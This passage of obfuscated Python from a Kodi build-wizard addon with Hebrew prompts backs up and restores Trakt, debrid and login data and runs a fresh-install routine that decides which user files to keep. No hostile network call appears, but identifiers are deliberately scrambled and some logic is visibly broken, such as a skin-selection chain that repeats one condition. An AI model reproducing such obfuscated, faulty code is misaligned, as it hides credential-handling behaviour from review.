			for O00OO00O000O0OO00 in OO0O0000O0O0OOO0O :#line:4458
				O0O0O000OOO000000 =os .path .join (loginit .LOGINFOLD ,O00OO00O000O0OO00 )#line:4459
				O00O0OO0O00OOO0OO =os .path .join (O00OO0OOO0O000OOO ,O00OO00O000O0OO00 )#line:4460
				if os .path .exists (O0O0O000OOO000000 ):#line:4461
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O00OO00O000O0OO00 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4462
					else :os .remove (O0O0O000OOO000000 )#line:4463
				shutil .copy (O00O0OO0O00OOO0OO ,O0O0O000OOO000000 )#line:4464
			loginit .importlist ('all')#line:4465
			loginit .loginIt ('restore','all')#line:4466
		if os .path .exists (OO0OO0000OO00OOO0 ):#line:4467
			O0OO0O0O0O00OOO0O +=1 #line:4468
			OO0O0000O0O0OOO0O =os .listdir (OO0OO0000OO00OOO0 )#line:4469
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4470
			for O00OO00O000O0OO00 in OO0O0000O0O0OOO0O :#line:4471
				O0O0O000OOO000000 =os .path .join (debridit .REALFOLD ,O00OO00O000O0OO00 )#line:4472
				O00O0OO0O00OOO0OO =os .path .join (OO0OO0000OO00OOO0 ,O00OO00O000O0OO00 )#line:4473
				if os .path .exists (O0O0O000OOO000000 ):#line:4474
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O00OO00O000O0OO00 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4475
					else :os .remove (O0O0O000OOO000000 )#line:4476
				shutil .copy (O00O0OO0O00OOO0OO ,O0O0O000OOO000000 )#line:4477
			debridit .importlist ('all')#line:4478
			debridit .debridIt ('restore','all')#line:4479
		wiz .cleanHouse (O0OOOO0OO0O00OOOO )#line:4480
		wiz .removeFolder (O0OOOO0OO0O00OOOO )#line:4481
		os .remove (O0OO0O00OO0O0O000 )#line:4482
		if O0OO0O0O0O00OOO0O ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4483
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4484
	elif OOO00OOO000OO0OOO =='export':#line:4485
		O000O00OOO00OO0O0 =xbmc .translatePath (MYBUILDS )#line:4486
		O000000O00OO00O00 =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4487
		traktit .traktIt ('update','all')#line:4488
		loginit .loginIt ('update','all')#line:4489
		debridit .debridIt ('update','all')#line:4490
		O000OO00OOO00000O =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4491
		O000OO00OOO00000O =xbmc .translatePath (O000OO00OOO00000O )#line:4492
		OOOO00OOO00OO0OO0 =os .path .join (O000O00OOO00OO0O0 ,'SaveData.zip')#line:4493
		OOOO000000OO00OOO =zipfile .ZipFile (OOOO00OOO00OO0OO0 ,mode ='w')#line:4494
		for O000OOOO0OOO00OOO in O000000O00OO00O00 :#line:4495
			if os .path .exists (O000OOOO0OOO00OOO ):#line:4496
				OO0O0000O0O0OOO0O =os .listdir (O000OOOO0OOO00OOO )#line:4497
				for O0O0O0000O00O0O00 in OO0O0000O0O0OOO0O :#line:4498
					OOOO000000OO00OOO .write (os .path .join (O000OOOO0OOO00OOO ,O0O0O0000O00O0O00 ),os .path .join (O000OOOO0OOO00OOO ,O0O0O0000O00O0O00 ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4499
		OOOO000000OO00OOO .close ()#line:4500
		if O000OO00OOO00000O ==O000O00OOO00OO0O0 :#line:4501
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO00OOO00OO0OO0 ))#line:4502
		else :#line:4503
			try :#line:4504
				xbmcvfs .copy (OOOO00OOO00OO0OO0 ,os .path .join (O000OO00OOO00000O ,'SaveData.zip'))#line:4505
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (O000OO00OOO00000O ,'SaveData.zip')))#line:4506
			except :#line:4507
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO00OOO00OO0OO0 ))#line:4508
def freshStart (install =None ,over =False ):#line:4513
	if USERNAME =='':#line:4514
		ADDON .openSettings ()#line:4515
		sys .exit ()#line:4516
	O000O000O000O00OO =u_list (SPEEDFILE )#line:4517
	(O000O000O000O00OO )#line:4518
	O0O000OOO00O00OOO =(wiz .workingURL (O000O000O000O00OO ))#line:4519
	(O0O000OOO00O00OOO )#line:4520
	if KEEPTRAKT =='true':#line:4521
		traktit .autoUpdate ('all')#line:4522
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4523
	if KEEPREAL =='true':#line:4524
		debridit .autoUpdate ('all')#line:4525
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4526
	if KEEPLOGIN =='true':#line:4527
		loginit .autoUpdate ('all')#line:4528
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4529
	if over ==True :O0OO0O00OO0OOO00O =1 #line:4530
	elif install =='restore':O0OO0O00OO0OOO00O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4531
	elif install :O0OO0O00OO0OOO00O =1 #line:4532
	else :O0OO0O00OO0OOO00O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4533
	if O0OO0O00OO0OOO00O :#line:4534
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4535
			O0OO00000O0O0000O ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4536
			skinSwitch .swapSkins (O0OO00000O0O0000O )#line:4539
			O000O00OO0OOO0OO0 =0 #line:4540
			xbmc .sleep (1000 )#line:4541
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O000O00OO0OOO0OO0 <150 :#line:4542
				O000O00OO0OOO0OO0 +=1 #line:4543
				xbmc .sleep (1000 )#line:4544
				wiz .ebi ('SendAction(Select)')#line:4545
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4546
				wiz .ebi ('SendClick(11)')#line:4547
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4548
			xbmc .sleep (1000 )#line:4549
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4550
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4551
			return #line:4552
		wiz .addonUpdates ('set')#line:4553
		OO0OOOO000OOOO00O =os .path .abspath (HOME )#line:4554
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4555
		OOOO00000000OO0O0 =sum ([len (OO0OOO0OOO0O00000 )for OO0OOO0OO0OO00OO0 ,O0OO0000OOOOOO00O ,OO0OOO0OOO0O00000 in os .walk (OO0OOOO000OOOO00O )]);O0OO00OOOOOOOO0O0 =0 #line:4556
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4557
		EXCLUDES .append ('My_Builds')#line:4558
		EXCLUDES .append ('archive_cache')#line:4559
		EXCLUDES .append ('script.module.requests')#line:4560
		EXCLUDES .append ('myfav.anon')#line:4561
		if KEEPREPOS =='true':#line:4562
			OOO00000000OO0OO0 =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4563
			for OO0OOO00OO0000000 in OOO00000000OO0OO0 :#line:4564
				OOO0O00O0O00OOO0O =os .path .split (OO0OOO00OO0000000 [:-1 ])[1 ]#line:4565
				if not OOO0O00O0O00OOO0O ==EXCLUDES :#line:4566
					EXCLUDES .append (OOO0O00O0O00OOO0O )#line:4567
		if KEEPSUPER =='true':#line:4568
			EXCLUDES .append ('plugin.program.super.favourites')#line:4569
		if KEEPMOVIELIST =='true':#line:4570
			EXCLUDES .append ('plugin.video.metalliq')#line:4571
		if KEEPMOVIELIST =='true':#line:4572
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4573
		if KEEPADDONS =='true':#line:4574
			EXCLUDES .append ('addons')#line:4575
		if KEEPADDONS =='true':#line:4576
			EXCLUDES .append ('addon_data')#line:4577
		EXCLUDES .append ('plugin.video.elementum')#line:4580
		EXCLUDES .append ('script.elementum.burst')#line:4581
		EXCLUDES .append ('script.elementum.burst-master')#line:4582
		EXCLUDES .append ('plugin.video.quasar')#line:4583
		EXCLUDES .append ('script.quasar.burst')#line:4584
		EXCLUDES .append ('skin.estuary')#line:4585
		if KEEPWHITELIST =='true':#line:4588
			O00O00OOO00O0O00O =''#line:4589
			O0000OO0000OO0000 =wiz .whiteList ('read')#line:4590
			if len (O0000OO0000OO0000 )>0 :#line:4591
				for OO0OOO00OO0000000 in O0000OO0000OO0000 :#line:4592
					try :O0OO000O00O0000OO ,OOO0O0O0OOOOOO00O ,O0OOOO0O000OO00O0 =OO0OOO00OO0000000 #line:4593
					except :pass #line:4594
					if O0OOOO0O000OO00O0 .startswith ('pvr'):O00O00OOO00O0O00O =OOO0O0O0OOOOOO00O #line:4595
					O00O0OO000OO0OOOO =dependsList (O0OOOO0O000OO00O0 )#line:4596
					for O0O0OOOO0O0000O00 in O00O0OO000OO0OOOO :#line:4597
						if not O0O0OOOO0O0000O00 in EXCLUDES :#line:4598
							EXCLUDES .append (O0O0OOOO0O0000O00 )#line:4599
						OOOOO000OO000O000 =dependsList (O0O0OOOO0O0000O00 )#line:4600
						for O0O0O00O0O00OOO00 in OOOOO000OO000O000 :#line:4601
							if not O0O0O00O0O00OOO00 in EXCLUDES :#line:4602
								EXCLUDES .append (O0O0O00O0O00OOO00 )#line:4603
					if not O0OOOO0O000OO00O0 in EXCLUDES :#line:4604
						EXCLUDES .append (O0OOOO0O000OO00O0 )#line:4605
				if not O00O00OOO00O0O00O =='':wiz .setS ('pvrclient',O0OOOO0O000OO00O0 )#line:4606
		if wiz .getS ('pvrclient')=='':#line:4607
			for OO0OOO00OO0000000 in EXCLUDES :#line:4608
				if OO0OOO00OO0000000 .startswith ('pvr'):#line:4609
					wiz .setS ('pvrclient',OO0OOO00OO0000000 )#line:4610
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4611
		OOOOOOO0OOOOO0OO0 =wiz .latestDB ('Addons')#line:4612
		for OO000O0OO0OOOO000 ,O0OO0OOOOOOOO0000 ,OOOOOO00OO00OO000 in os .walk (OO0OOOO000OOOO00O ,topdown =True ):#line:4613
			O0OO0OOOOOOOO0000 [:]=[OOOO000000OO0OOO0 for OOOO000000OO0OOO0 in O0OO0OOOOOOOO0000 if OOOO000000OO0OOO0 not in EXCLUDES ]#line:4614
			for O0OO000O00O0000OO in OOOOOO00OO00OO000 :#line:4615
				O0OO00OOOOOOOO0O0 +=1 #line:4616
				O0OOOO0O000OO00O0 =OO000O0OO0OOOO000 .replace ('/','\\').split ('\\')#line:4617
				O000O00OO0OOO0OO0 =len (O0OOOO0O000OO00O0 )-1 #line:4619
				if O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -2 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4620
				elif O0OO000O00O0000OO =='MyVideos99.db'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4621
				elif O0OO000O00O0000OO =='MyVideos107.db'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4622
				elif O0OO000O00O0000OO =='MyVideos116.db'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4623
				elif O0OO000O00O0000OO =='MyVideos99.db'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4624
				elif O0OO000O00O0000OO =='MyVideos107.db'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4625
				elif O0OO000O00O0000OO =='MyVideos116.db'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4626
				elif O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -2 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4627
				elif O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -2 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='addon_data'and 'skin.anonymous.mod'in O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4628
				elif O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -2 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='addon_data'and 'skin.Premium.mod'in O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4629
				elif O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -2 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='addon_data'and 'skin.anonymous.nox'in O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4630
				elif O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -2 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='addon_data'and 'skin.phenomenal'in O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4631
				elif O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -2 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='addon_data'and 'plugin.video.metalliq'in O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4632
				elif O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -2 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='addon_data'and 'skin.titan'in O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4634
				elif O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -2 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='addon_data'and 'pvr.iptvsimple'in O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4635
				elif O0OO000O00O0000OO =='sources.xml'and O0OOOO0O000OO00O0 [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4637
				elif O0OO000O00O0000OO =='quicknav.DATA.xml'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -2 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4640
				elif O0OO000O00O0000OO =='x1101.DATA.xml'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -2 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4641
				elif O0OO000O00O0000OO =='b-srtym-b.DATA.xml'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -2 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4642
				elif O0OO000O00O0000OO =='x1102.DATA.xml'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -2 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4643
				elif O0OO000O00O0000OO =='b-sdrvt-b.DATA.xml'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -2 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4644
				elif O0OO000O00O0000OO =='x1112.DATA.xml'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -2 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4645
				elif O0OO000O00O0000OO =='b-tlvvyzyh-b.DATA.xml'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -2 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4646
				elif O0OO000O00O0000OO =='x1111.DATA.xml'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -2 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4647
				elif O0OO000O00O0000OO =='b-tvknyshrly-b.DATA.xml'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -2 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4648
				elif O0OO000O00O0000OO =='x1110.DATA.xml'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -2 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4649
				elif O0OO000O00O0000OO =='b-yldym-b.DATA.xml'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -2 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4650
				elif O0OO000O00O0000OO =='x1114.DATA.xml'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -2 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4651
				elif O0OO000O00O0000OO =='b-mvzyqh-b.DATA.xml'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -2 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4652
				elif O0OO000O00O0000OO =='mainmenu.DATA.xml'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -2 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4653
				elif O0OO000O00O0000OO =='skin.Premium.mod.properties'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -2 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4654
				elif O0OO000O00O0000OO =='favourites.xml'and O0OOOO0O000OO00O0 [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4658
				elif O0OO000O00O0000OO =='guisettings.xml'and O0OOOO0O000OO00O0 [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4660
				elif O0OO000O00O0000OO =='profiles.xml'and O0OOOO0O000OO00O0 [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4661
				elif O0OO000O00O0000OO =='advancedsettings.xml'and O0OOOO0O000OO00O0 [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4662
				elif O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -2 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4663
				elif O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -2 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='addon_data'and 'program.apollo'in O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4664
				elif O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -2 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='addon_data'and 'plugin.video.allmoviesin'in O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4665
